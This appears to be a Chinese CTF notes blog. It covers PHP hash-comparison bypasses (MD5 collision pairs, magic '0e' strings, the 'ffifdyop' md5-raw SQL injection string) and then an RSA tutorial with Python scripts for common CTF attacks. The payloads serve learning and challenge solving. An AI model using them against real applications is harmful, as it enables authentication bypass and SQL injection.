<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Md5 Revenge Now!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if((string)$_POST[&#x27;param1&#x27;]!==(string)$_POST[&#x27;param2&#x27;] &amp;&amp; md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">        die(&quot;success!);</span></span><br><span class="line"><span class="comment"> &#125; --&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06</span><br><span class="line">&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</span><br></pre></td></tr></table></figure>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">param<span class="number">1</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%00</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1U</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span>&amp;param<span class="number">2</span><span class="operator">=</span>M<span class="variable">%C9h</span><span class="variable">%FF</span><span class="variable">%0</span>E<span class="variable">%E3</span><span class="variable">%5</span>C<span class="variable">%20</span><span class="variable">%95</span>r<span class="variable">%D4w</span><span class="variable">%7</span>Br<span class="variable">%15</span><span class="variable">%87</span><span class="variable">%D3o</span><span class="variable">%A7</span><span class="variable">%B2</span><span class="variable">%1</span>B<span class="variable">%DCV</span><span class="variable">%B7J</span><span class="variable">%3</span>D<span class="variable">%C0x</span><span class="variable">%3</span>E<span class="variable">%7</span>B<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%AF</span><span class="variable">%BF</span><span class="variable">%A2</span><span class="variable">%02</span><span class="variable">%A8</span><span class="variable">%28</span>K<span class="variable">%F3n</span><span class="variable">%8</span>EKU<span class="variable">%B3_Bu</span><span class="variable">%93</span><span class="variable">%D8Igm</span><span class="variable">%A0</span><span class="variable">%D1</span><span class="variable">%D5</span><span class="variable">%5</span>D<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%FB_</span><span class="variable">%07</span><span class="variable">%FE</span><span class="variable">%A2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span><span class="number">55</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span>&amp;para<span class="name">m2</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span>d<span class="number">5</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>11230178，md5值为0e732639146814822596b49bb6939b97</p>
<h2 id="双md5结果仍为0e开头字符串大全"><a href="#双md5结果仍为0e开头字符串大全" class="headerlink" title="双md5结果仍为0e开头字符串大全"></a>双md5结果仍为0e开头字符串大全</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">CbDLytmyGm2xQyaLNhWn</span></span><br><span class="line"><span class="attribute">md5</span>(CbDLytmyGm<span class="number">2</span>xQyaLNhWn) =&gt; <span class="number">0</span>ec<span class="number">20</span>b<span class="number">7</span>c<span class="number">66</span>cafbcc<span class="number">7</span>d<span class="number">8</span>e<span class="number">8481</span>f<span class="number">0653</span>d<span class="number">18</span></span><br><span class="line"><span class="attribute">md5</span>(md<span class="number">5</span>(CbDLytmyGm<span class="number">2</span>xQyaLNhWn)) =&gt; <span class="number">0</span>e<span class="number">3</span>a<span class="number">5</span>f<span class="number">2</span>a<span class="number">80</span>db<span class="number">371</span>d<span class="number">4610</span>b<span class="number">8</span>f<span class="number">940</span>d<span class="number">296</span>af</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">770hQgrBOjrcqftrlaZk</span></span><br><span class="line"><span class="attribute">md5</span>(<span class="number">770</span>hQgrBOjrcqftrlaZk) =&gt; <span class="number">0</span>e<span class="number">689</span>b<span class="number">4</span>f<span class="number">703</span>bdc<span class="number">753</span>be<span class="number">7</span>e<span class="number">27</span>b<span class="number">45</span>cb<span class="number">3625</span></span><br><span class="line"><span class="attribute">md5</span>(md<span class="number">5</span>(<span class="number">770</span>hQgrBOjrcqftrlaZk)) =&gt; <span class="number">0</span>e<span class="number">2756</span>da<span class="number">68</span>ef<span class="number">740</span>fd<span class="number">8</span>f<span class="number">5</span>a<span class="number">5</span>c<span class="number">26</span>cc<span class="number">45064</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">7r4lGXCH2Ksu2JNT3BYM</span></span><br><span class="line"><span class="attribute">md5</span>(<span class="number">7</span>r<span class="number">4</span>lGXCH<span class="number">2</span>Ksu<span class="number">2</span>JNT<span class="number">3</span>BYM) =&gt; <span class="number">0</span>e<span class="number">269</span>ab<span class="number">12</span>da<span class="number">27</span>d<span class="number">79</span>a<span class="number">6626</span>d<span class="number">91</span>f<span class="number">34</span>ae<span class="number">849</span></span><br><span class="line"><span class="attribute">md5</span>(md<span class="number">5</span>(<span class="number">7</span>r<span class="number">4</span>lGXCH<span class="number">2</span>Ksu<span class="number">2</span>JNT<span class="number">3</span>BYM)) =&gt; <span class="number">0</span>e<span class="number">48</span>d<span class="number">320</span>b<span class="number">2</span>a<span class="number">97</span>ab<span class="number">295</span>f<span class="number">5</span>c<span class="number">4694759889</span>f</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="md5-md5-md5"><a href="#md5-md5-md5" class="headerlink" title="$md5=md5($md5)"></a>$md5=md5($md5)</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">md5</span>(&#x27;<span class="number">0</span>e<span class="number">215962017</span>&#x27;) ==&gt; “<span class="number">0</span>e<span class="number">291242476940776845150308577824</span>”</span><br></pre></td></tr></table></figure>




<h2 id="php中md5-str-true-注入"><a href="#php中md5-str-true-注入" class="headerlink" title="php中md5($str,true)注入"></a>php中md5($str,true)注入</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line"><span class="number">4</span>SV<span class="number">7</span>p</span><br><span class="line">bJ<span class="name">m4</span>aG</span><br><span class="line">b<span class="symbol">Nas5</span>p</span><br><span class="line">ckHAEb</span><br></pre></td></tr></table></figure>




<h2 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>] != <span class="built_in">hash</span>(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    die(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0e251288019<br>0e898201062</p>
<h2 id="MD2"><a href="#MD2" class="headerlink" title="MD2"></a>MD2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">99999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$x1</span>=hash(<span class="string">&quot;md2&quot;</span>, <span class="string">&#x27;0e&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;024452&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$x1</span>,<span class="number">0</span>,<span class="number">2</span>)===<span class="string">&#x27;0e&#x27;</span>  <span class="keyword">and</span> is_numeric(<span class="variable">$x1</span>))&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">999999</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line"><span class="variable">$x2</span>=hash(<span class="string">&#x27;md2&#x27;</span>,hash(<span class="string">&quot;md2&quot;</span>, <span class="string">&#x27;0e&#x27;</span>.<span class="variable">$j</span>.<span class="string">&#x27;48399&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$x2</span>,<span class="number">0</span>,<span class="number">2</span>)===<span class="string">&#x27;0e&#x27;</span>  <span class="keyword">and</span> is_numeric(<span class="variable">$x2</span>))&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;b=0e&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;024452&amp;c=0e&#x27;</span>.<span class="variable">$j</span>.<span class="string">&#x27;48399&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>b=0e652024452&amp;c=0e603448399</p>
<h2 id="shal"><a href="#shal" class="headerlink" title="shal"></a>shal</h2><p> if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){</p>
<p>aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>RSA算法</title>
    <url>/2020/07/27/RSA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>rsa算法及其常见攻击方法总结<a id="more"></a></p>
<h1 id="RSA-算法"><a href="#RSA-算法" class="headerlink" title="RSA 算法"></a>RSA 算法</h1><p>1.<strong>质数（素数)**是指在大于1的自然数中，除了1和它本身以外不再有其他因数的自然数。<br>2.**合数</strong>是指比1大但不是素数的数<br>3.<strong>约数（因数）</strong>整数a除以整数b(b≠0) 除得的商正好是整数而没有余数，我们就说a能被b整除，或b能整除a。a称为  b的倍数，b称为a的约数<br>4.<strong>互质数</strong>：如果两个整数a,b的最大公因数（greatest common divisor）为1，即gcb(a,b)=1，那么称a,b两数互质<br>5.<strong>欧拉函数</strong>是指设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)，叫做欧拉函</p>
<hr>
<h2 id="RSA加解密涉及变量"><a href="#RSA加解密涉及变量" class="headerlink" title="RSA加解密涉及变量"></a>RSA加解密涉及变量</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">N</span>(n):模数（<span class="selector-tag">modulus</span>）</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> 和 <span class="selector-tag">q</span> ：<span class="selector-tag">N</span>的两个因子（<span class="selector-tag">factor</span>）</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">e</span> 和 <span class="selector-tag">d</span>：(密钥) 互为模反数的两个指数（<span class="selector-tag">exponent</span>）</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">c</span> 和 <span class="selector-tag">m</span>：分别是密文和明文，这里一般指的是一个十进制的数还有一个就是<span class="selector-tag">n</span>的欧拉函数值</span><br><span class="line"></span><br><span class="line">欧拉函数值：<span class="selector-tag">r</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">pow</span>(x, y, z)：效果等效<span class="selector-tag">pow</span>(x, y)<span class="selector-tag">1</span> % <span class="selector-tag">z</span>， 先计算<span class="selector-tag">x</span>的<span class="selector-tag">y</span>次方，如果存在另一个参数<span class="selector-tag">z</span>，需要再对结果进行取模。</span><br></pre></td></tr></table></figure>


<hr>
<h2 id="RSA-密钥流程"><a href="#RSA-密钥流程" class="headerlink" title="RSA 密钥流程"></a>RSA 密钥流程</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>.选择两个大的参数，计算出模数 N = p * q</span><br><span class="line"></span><br><span class="line"><span class="attribute">2</span>.计算欧拉函数 φ = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)，然后选择一个e(<span class="number">1</span>&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有<span class="number">1</span>的两个整数）</span><br><span class="line"></span><br><span class="line"><span class="attribute">3</span>.选一个整数e,满足条件<span class="number">1</span>&lt;e&lt;φ(m),且gcd(φ(m),e)=<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line"><span class="attribute">4</span>.取e的模反数d，计算方法为:e * d ≡ <span class="number">1</span> (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - <span class="number">1</span> 被n整除，或者说e * d被n除的余数是<span class="number">1</span>。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说<span class="number">5</span>除<span class="number">3</span>余数为<span class="number">2</span>，<span class="number">11</span>除<span class="number">3</span>余数也为<span class="number">2</span>，于是可写成<span class="number">11</span> ≡ <span class="number">5</span>(mod <span class="number">3</span>)。）</span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span>.对明文m进行加密：c = pow(m, e, N),可以得到密文c。</span><br><span class="line"></span><br><span class="line"><span class="attribute">6</span>.对密文c进行解密：m = pow(c, d, N),可以得到明文m。</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<pre><code>      **对于RSA加密算法，公钥&#123;e，n&#125;为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数N，然后计算欧拉函数φ(n)=(p-1) * (q-1),再通过d * e ≡ 1 mod φ(N)，即可计算出 d，然后就可以使用私钥&#123;d,n&#125;通过m = pow(c,d,N)解密明文。**
</code></pre>
<h1 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a>常见攻击方法</h1><h2 id="已知p、q、e或者已知n、e求出d"><a href="#已知p、q、e或者已知n、e求出d" class="headerlink" title="已知p、q、e或者已知n、e求出d"></a><strong>已知<code>p</code>、<code>q</code>、<code>e</code>或者已知<code>n</code>、<code>e</code>求出<code>d</code></strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.mpz(<span class="number">18443</span>)<span class="comment">#初始化大整数</span></span><br><span class="line">q = gmpy2.mpz(<span class="number">49891</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">19</span>)</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)  <span class="comment"># invert（e，r）返回d使得e * d == 1 mod r，如果不存在d，则返回0</span></span><br><span class="line">print(<span class="string">&quot;p=&#123;0&#125;,q=&#123;1&#125;,e=&#123;2&#125;&quot;</span>.<span class="built_in">format</span>(p,q,e))</span><br><span class="line">print(<span class="string">&quot;d is:\n%s&quot;</span>%d)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注：gmpy2：开源的高精度算数运算库<a href="https://blog.csdn.net/x_yhy/article/details/83903367">https://blog.csdn.net/x_yhy/article/details/83903367</a></p>
<pre><code>    分解`Ｎ`得到`p` `q`可以通过在线网站http://www.factordb.com/index.php
</code></pre>
<h2 id="已经求出d、n、c，然后可以求出相应的明文m"><a href="#已经求出d、n、c，然后可以求出相应的明文m" class="headerlink" title="已经求出d、n、c，然后可以求出相应的明文m"></a><strong>已经求出<code>d</code>、<code>n</code>、<code>c</code>，然后可以求出相应的明文m</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#求明文</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">920139713</span>   <span class="comment">#模数</span></span><br><span class="line">d = <span class="number">96849619</span>    <span class="comment">#密钥</span></span><br><span class="line">c = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">704796792</span></span><br><span class="line"><span class="string">752211152</span></span><br><span class="line"><span class="string">274704164</span></span><br><span class="line"><span class="string"><span class="meta">... </span> #密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">c_list = c.split()</span><br><span class="line"><span class="comment">#print(c_list)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c_list:</span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(i),d,n))</span><br><span class="line">print(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="已知c、e、n求m"><a href="#已知c、e、n求m" class="headerlink" title="已知c、e、n求m"></a><strong>已知<code>c</code>、<code>e</code>、<code>n</code>求m</strong></h2><p>结合以上两种方法，在知道<code>n</code>的前提下可求·<code>p</code>、<code>q</code>,利用<code>p</code>、<code>q</code>、<code>e</code>可以求出<code>d</code>，，从而因为已知<code>d</code>、<code>n</code>、<code>c</code>，求出相应的明文m</p>
<hr>
<h2 id="利用n的公约数"><a href="#利用n的公约数" class="headerlink" title="利用n的公约数"></a><strong>利用n的公约数</strong></h2><p>当题目给出若干个模数n1,n2……,且模数很大。如果两次加密的<code>n1</code>和<code>n2</code>具有相同的素因子，那么我们可以利用<code>欧几里德算法</code>直接分解<code>n1</code>和<code>n2</code>.从而计算出两个<code>n</code>的最大公约数<code>p</code>：</p>
<blockquote>
<p>素因子的定义：对于一个数n来说，将它的因子拆到若干个素数相乘，这些素数被称为n的素因子。<br>比如 12可以被拆为2 6<br>6不是质数，可以继续拆为2*3<br>所以最后12的素因子就是 2, 3（不计重复元素）</p>
</blockquote>
<p>识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法直接分解<a href="http://www.factordb.com/index.php%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%98%8E%E6%96%87%E9%83%BD%E6%B2%A1%E4%BB%80%E4%B9%88%E8%81%94%E7%B3%BB%EF%BC%8Ce%E4%B9%9F%E4%B8%80%E8%88%AC%E5%8F%9665537%E3%80%82">http://www.factordb.com/index.php，并且明文都没什么联系，e也一般取65537。</a></p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202007/1999159-20200712082911929-729980764.png"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">求两个数的最大公约数</span></span><br><span class="line"><span class="string">算法参考:https://zhidao.baidu.com/question/36550887.html</span></span><br><span class="line"><span class="string">by:reborn</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">import gmpy2</span><br><span class="line">n1=</span><br><span class="line">n2=</span><br><span class="line">def gys1(n1,n2):    #辗转相除法(欧几里德算法)</span><br><span class="line">    <span class="keyword">if</span> n1&lt;n2:</span><br><span class="line">        n1,<span class="attribute">n2</span>=n2,n1</span><br><span class="line">    <span class="keyword">while</span> n2!=0:</span><br><span class="line">        <span class="attribute">temp</span>=n1%n2</span><br><span class="line">        <span class="attribute">n1</span>=n2</span><br><span class="line">        <span class="attribute">n2</span>=temp</span><br><span class="line">    return n1</span><br><span class="line">def gys2(n1,n2):    #更相减损法</span><br><span class="line">    <span class="keyword">while</span> n1!=n2:</span><br><span class="line">        <span class="keyword">if</span> n1&lt;n2:</span><br><span class="line">            n1,<span class="attribute">n2</span>=n2,n1</span><br><span class="line">        <span class="attribute">temp</span>=n1-n2</span><br><span class="line">        <span class="attribute">n1</span>=temp</span><br><span class="line">    return n1</span><br><span class="line"><span class="attribute">p</span>=gys2(n1,n2)</span><br><span class="line"><span class="builtin-name">print</span> (<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求q1,q2</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">q1</span>=n1//p</span><br><span class="line"><span class="attribute">q2</span>=n2//p</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;q1=&quot;</span>,q1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;q2=&quot;</span>,q2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求d_1,d_2</span></span><br><span class="line"></span><br><span class="line">p0 = gmpy2.mpz(p)#初始化大整数</span><br><span class="line">q_1 = gmpy2.mpz(q1)</span><br><span class="line">q_2 = gmpy2.mpz(q2)</span><br><span class="line">e = gmpy2.mpz(65537)</span><br><span class="line">r_1 = (p0-1)*(q_1-1)</span><br><span class="line">r_2 = (p0-1)*(q_2-1)</span><br><span class="line">d_1 = gmpy2.invert(e,r_1)  # invert（e，r）返回d使得e * d == 1 mod r，如果不存在d，则返回0</span><br><span class="line">d_2 = gmpy2.invert(e,r_2)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;d_1=&quot;</span>,d_1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;d_2=&quot;</span>,d_2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求c1,c2</span></span><br><span class="line"></span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">m1 = pow(c1, d_1, n1)</span><br><span class="line">m2 = pow(c2, d_2, n2)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;m1=&quot;</span>,m1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">&quot;m2=&quot;</span>,m2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据<code>欧几里德算法</code>算出的<code>p</code>之后，再用<code>n</code>除以<code>p</code>即可求出<code>q</code>，由此可以得到的参数有<code>p</code>、<code>q</code>、<code>n</code>、<code>e</code>，再使用常规方法计算出<code>d</code>，即可破解密文。</p>
<p>m = pow(c, d, N),可以得到明文m</p>
<hr>
<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a><strong>共模攻击</strong></h2><p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>
<blockquote>
<p>c1 = m^e1 mod n<br>c2 = m^e2 mod n</p>
</blockquote>
<p>识别：非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。</p>
<hr>
<h2 id="已知私钥文件、c求m"><a href="#已知私钥文件、c求m" class="headerlink" title="已知私钥文件、c求m"></a><strong>已知私钥文件、c求m</strong></h2><p>题目中给出了私钥文件private.pem和flag.enc </p>
<p>pem文件通常是包含了—–BEGIN PRIVATE KEY—–和—–END PRIVATE KEY—–，是 Base64 编码的二进制内容<br>使用私钥解密密文的方式</p>
<p>使用openssl工具<br>利用如下命令：</p>
<blockquote>
<p>rsautl -decrypt -in flag.enc(密文名称) -inkey private.pem</p>
</blockquote>
<hr>
<h2 id="已知公钥文件、c求m"><a href="#已知公钥文件、c求m" class="headerlink" title="已知公钥文件、c求m"></a><strong>已知公钥文件、c求m</strong></h2><p>题目中给出了public.pem和密文flag.enc</p>
<blockquote>
<p>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem<br>  [提取出pubkey.pem中的参数]</p>
</blockquote>
<blockquote>
<p>得到n，化为十进制</p>
</blockquote>
<blockquote>
<p>将n分解为P，q</p>
</blockquote>
<blockquote>
<p>python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</p>
